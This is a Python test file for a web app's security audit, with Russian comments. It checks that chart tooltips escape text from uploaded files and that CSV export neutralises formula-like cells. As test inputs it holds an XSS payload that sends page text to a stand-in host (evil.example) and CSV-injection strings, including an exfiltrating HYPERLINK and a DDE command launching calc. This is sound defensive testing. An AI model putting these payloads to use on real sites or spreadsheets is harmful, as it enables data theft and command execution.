"""Аудит 3: текст из файла пользователя не исполняется в подсказках графиков (03-01)
и не становится формулой в CSV-экспорте (03-04).

Функции `web/src/escape.ts` запускаются настоящим Node (22.6+, флаг
`--experimental-strip-types`); без подходящего Node эти тесты пропускаются,
структурные проверки исходников работают всегда.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

WEB = Path(__file__).resolve().parents[1] / "web" / "src"
PAYLOAD = '<img src=x onerror="fetch(\'http://evil.example/\'+document.body.innerText)">'
# Поля PlotBundle с текстом из файла, которые попадают в подсказки (отчёт 03-01).
DATA_FIELDS = (r"b\.labels\[", r"it\.label\b", r"g\.factor_[ab]\b", r"g\.levels_a\[", r"s\.name\b",
               r"h\.rows\[", r"h\.columns\[", r"pd\.labels\[", r"b\.items\[[^\]]*\]\.label\b",
               r"sf\.names\[", r"xName\b", r"label\b(?!\s*\?)")


def _node() -> str | None:
    exe = shutil.which("node")
    if not exe:
        return None
    version = subprocess.run([exe, "--version"], capture_output=True, text=True, encoding="utf-8").stdout.strip()
    major, minor = (int(x) for x in version.lstrip("v").split(".")[:2])
    return exe if (major, minor) >= (22, 6) else None


def _call(function: str, *args: object) -> str:
    exe = _node()
    if exe is None:
        pytest.skip("нужен Node 22.6+ для запуска web/src/escape.ts")
    script = (f"import({json.dumps((WEB / 'escape.ts').as_uri())}).then((m) => "
              f"process.stdout.write(JSON.stringify(m.{function}(...{json.dumps(list(args))}))))")
    out = subprocess.run([exe, "--experimental-strip-types", "--no-warnings", "-e", script],
                         capture_output=True, text=True, encoding="utf-8", check=True)
    return json.loads(out.stdout)


# --- 03-01. Подсказки графиков ---------------------------------------------------------------

def test_03_01_tooltip_formatters_escape_every_data_string() -> None:
    """Строка из `tooltip.formatter` вставляется как HTML: каждое поле из файла — через esc()."""
    text = (WEB / "charts.tsx").read_text(encoding="utf-8")
    assert 'import { escapeHtml as esc } from "./escape";' in text
    # Заголовок графика (`title:`) React выводит текстом — он не опасен и в проверку не входит.
    lines = [line for line in text.splitlines() if "title:" not in line]
    raw = [m.group(0) for field in DATA_FIELDS for line in lines
           for m in re.finditer(r"\$\{" + field + r"[^}]*\}", line)]
    assert raw == [], f"в подсказку попадает неэкранированный текст: {raw}"
    assert len(re.findall(r"\$\{esc\(", text)) >= 15


def test_03_01_no_raw_html_sinks_in_the_app() -> None:
    """innerHTML и dangerouslySetInnerHTML в коде сайта нет (стенд bench не входит в сборку)."""
    for path in WEB.glob("*.ts*"):
        source = path.read_text(encoding="utf-8")
        assert "dangerouslySetInnerHTML" not in source and ".innerHTML" not in source, path.name


def test_03_01_escape_html_neutralises_markup() -> None:
    safe = _call("escapeHtml", PAYLOAD)
    assert "<" not in safe and ">" not in safe and '"' not in safe and "'" not in safe
    assert safe.startswith("&lt;img src=x onerror=&quot;fetch(&#39;http://evil.example/")
    assert _call("escapeHtml", "овёс & ячмень") == "овёс &amp; ячмень"
    assert _call("escapeHtml", None) == "" and _call("escapeHtml", 5) == "5"


# --- 03-04. CSV-экспорт сводки ---------------------------------------------------------------

FORMULAS = ['=HYPERLINK("http://evil.example/?"&A2;"click")', "+1+1", "-2+3", "@SUM(1+1)",
            "=cmd|' /C calc'!A0", "\t=1+1", "\r=1+1"]


@pytest.mark.parametrize("header", FORMULAS)
def test_03_04_formula_like_cells_are_defused(header: str) -> None:
    """Имя колонки из чужого файла, начинающееся с = + - @, Excel выполнил бы как формулу."""
    cell = _call("csvCell", header)
    inner = cell[1:-1].replace('""', '"') if cell.startswith('"') else cell
    assert inner == "'" + header  # апостроф впереди: Excel показывает текст


def test_03_04_numbers_and_ordinary_text_are_untouched() -> None:
    assert _call("csvCell", -2.5) == "-2.5" and _call("csvCell", 12) == "12"
    assert _call("csvCell", "урожай") == "урожай" and _call("csvCell", "") == ""
    assert _call("csvCell", "a;b") == '"a;b"' and _call("csvCell", 'он сказал "да"') == '"он сказал ""да"""'


def test_03_04_summary_export_uses_csv_cell() -> None:
    text = (WEB / "components.tsx").read_text(encoding="utf-8")
    assert "row.map((cell) => csvCell(cell)).join" in text
    assert 'import { csvCell } from "./escape";' in text
